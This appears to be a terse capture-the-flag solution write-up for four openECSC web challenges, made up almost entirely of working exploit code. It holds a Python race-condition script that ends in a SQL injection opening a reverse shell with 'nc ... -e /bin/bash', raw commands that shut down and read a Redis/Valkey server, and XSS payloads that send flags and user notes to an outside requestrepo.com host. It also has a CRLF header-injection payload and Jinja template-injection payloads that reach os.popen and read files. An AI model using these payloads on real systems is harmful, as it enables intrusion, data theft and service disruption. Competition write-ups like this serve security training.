# plfanzen-laden-revenge
solves: 2

race conditions to increase the balance -> sqli -> rce -> crash the server and get the flag from redis
```python
import asyncio
import aiohttp
import time
import uuid

url = "https://b14a4a3a-cdc8-4b23-a537-108178b3ddba.openec.sc:1337/"

user = str(uuid.uuid4())
creds = {
    "username": user,
    "email": f"{user}@dsd.com",
    "password": "sebb"
}

PREMIUM_FEE = 10**100
THRESHOLD_STOCK = 10**21
CART_CHUNK = 10**17

async def curr_balance(session):
    try:
        resp = await session.get(f"{url}/users/me")
        data = await resp.json()
        return data.get("balance", 0)
    except Exception as e:
        print("fail getting balance", e)
        return 0

async def curr_stock(session):
    try:
        resp = await session.get(f"{url}/products/1")
        data = await resp.json()
        return int(data.get("quantity", 0))
    except Exception as e:
        print('not getting stock', e)
        return 0

async def rev_shell(session):
    payload = {
        "stars": 5,
        "description": "'xxx'; copy (SELECT '') to program 'nc VPS 666 -e /bin/bash'; update reviews set description='xxx' "
    }
    await session.post(f"{url}/reviews/product/1", json=payload)
    await session.post(f"{url}/reviews/product/1", json=payload)

async def add_cart(session, amount: int):
    await session.post(f"{url}/cart/1", json={"quantity": amount})

async def clear_burst(session, n: int):
    tasks = [session.post(f"{url}/cart/clear") for _ in range(n)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    ok = sum(1 for r in results if getattr(r, 'status', 200) == 200)
    return ok

async def incr_stock(session):
    q = await curr_stock(session)
    print(f"\nstock {q}")
    if q >= THRESHOLD_STOCK:
        print("threshold reached")
        return True
    if q <= 0:
        print("[-] no stock!")
        exit()

    if q <= CART_CHUNK:
        await add_cart(session, q)
        clears = 20

        clear_time = time.time()
        await clear_burst(session, clears)
        print(f"clear took {time.time() - clear_time}")
    else:
        reserve_time = time.time()
        i = 0
        while q > 0:
            await add_cart(session, min(CART_CHUNK, q))
            q -= CART_CHUNK
            i += 1
        print(f"reserve took {time.time() - reserve_time} - {i} iterations")
        
        clear_time = time.time()
        await clear_burst(session, 70)
        print(f"clear took {time.time() - clear_time}")
        
    return False

async def race_balance(session):
    tasks = [session.post(f"{url}/products/1/buy-all") for _ in range(3)]
    await asyncio.gather(*tasks, return_exceptions=True)

    t0 = time.time()
    tasks = [session.post(f"{url}/products/1/refund-all") for _ in range(5)]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"refund all took {time.time() - t0}")
    return True

async def main():
    start = time.time()
    connector = aiohttp.TCPConnector(limit=200, limit_per_host=200, force_close=False)
    timeout = aiohttp.ClientTimeout(total=60)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        try:
            await session.post(f"{url}/auth/signup", json=creds)
        except:
            pass
        await session.post(f"{url}/auth/login", json=creds)

        threshold_reached = False

        while True:
            now = time.time()
            if now - start > 60 * 6:
                break

            t0 = time.time()
            if not threshold_reached:
                threshold_reached = await incr_stock(session)
            else:
                ok = await race_balance(session)
                if ok:
                    bal = await curr_balance(session)
                    if bal > 0:
                        print(f"\nbalance: {bal}")
                    else:
                        print(f"\n[-] lost everything!")
                        exit()
                    if bal >= PREMIUM_FEE:
                        result = await session.post(f"{url}/users/elevate")
                        text = await result.text()
                        print(f"SUCCESS: {text}")
                        await rev_shell(session)
                        break

            it = time.time() - t0
            print(f"elapsed: {round((time.time()-start)/60, 2)}min - curr iteration: {round(it, 3)}sec")
        
        bal = await curr_balance(session)
        if bal >= PREMIUM_FEE:
            result = await session.post(f"{url}/users/elevate")
            text = await result.text()
            print(f"SUCCESS: {text}")
            await rev_shell(session)

if __name__ == "__main__":
    asyncio.run(main())

# printf 'SHUTDOWN NOSAVE\r\n' | nc -w 2 valkey 6379
# printf '*6\r\n$4\r\nSCAN\r\n$1\r\n0\r\n$5\r\nMATCH\r\n$6\r\nFLAG_*\r\n$5\r\nCOUNT\r\n$4\r\n1000\r\n' | nc -w 2 valkey 6379
# printf 'GET FLAG_BDxG1RWcb454tgYD4pJxOsjc4Aw\r\n' | nc -w 2 valkey 6379

# bash -c 'set -euo pipefail; HOST=${HOST:-valkey}; PORT=${PORT:-6379}; SLEEP_SECS=${SLEEP_SECS:-1};  printf "SHUTDOWN NOSAVE\r\n" | nc -w 2 valkey 6379; SCAN_REQ=$'"'"'*6\r\n$4\r\nSCAN\r\n$1\r\n0\r\n$5\r\nMATCH\r\n$6\r\nFLAG_*\r\n$5\r\nCOUNT\r\n$4\r\n1000\r\n'"'"'; nc_flags() { if nc -h 2>&1 | grep -q " -N "; then echo "-N -w 2"; elif nc -h 2>&1 | grep -q " -q "; then echo "-q 1 -w 2"; else echo "-w 2"; fi; }; NCFLAGS="$(nc_flags)"; flagkey=""; while :; do resp="$(printf %s "$SCAN_REQ" | nc $NCFLAGS "$HOST" "$PORT" || true)"; flagkey="$(printf %s "$resp" | tr -d "\r" | awk "/^FLAG_/ {print; exit}")"; [ -n "$flagkey" ] && { echo "Found key: $flagkey" >&2; break; }; sleep "$SLEEP_SECS"; done; eval "printf '\''GET $flagkey\r\n'\'' | nc -w 2 valkey 6379"' 
# openECSC{r4c3_c0nd1ti0ns_4re_v3ry_p0g_meow_🐈_ad1fdd183f0c}
# openECSC{r4c3_c0nd1ti0ns_4re_st1l7_v3r7_p0g_m30w_🐈_681e09599139}
```

# kw-messenger
response crlf injection -> xss
```
/download?uuid=4894968c-5d98-455b-bd8f-2fcb71e4f469&filename=x.%0d%0aContent-Dispositxion:%20inline%0d%0aContent-Type:%20application/javascript%0d%0a%0d%0afetch(`/flag`).then(r+%3d>+r.text()).then(s+%3d>+location=`//zxpe4e0y.requestrepo.com?c=`%2bs)//aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
`openECSC{c21f_1nj3c710n_4nd_73_f02_7h3_w1n}`

# kitty chat
loose comparison login bypass
```js
if (accounts[data.username]?.userkey == data.key) {
	ws.verified = true;
	setUsername(ws, data.username, false);
}
```
into xss
```
(async () => navigator.sendBeacon('//zxpe4e0y.requestrepo.com', (await (await fetch('/notes', {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({ key: (await (await fetch('/user')).json()).userkey }),})).json()).notes))()

flag{n1c3_j0b_but_n0w_d0_1t_w1th_csp}
```

# jinjails
```
{{typing['s\x79s']['m\6fdules']['os'].popen('ls').read()}}
{{typing|attr("s\x79s").meta_path[2].find_spec('os').loader.get_data('/flag.txt')}}

openECSC{th1s_t1m3_l04d3r_4ctu4lly_g0_brrrrrrrr_7a2549158a23}
openECSC{4tt3rg4ttr_g0_brrrrrrrr_faa12ebc4eb8}
```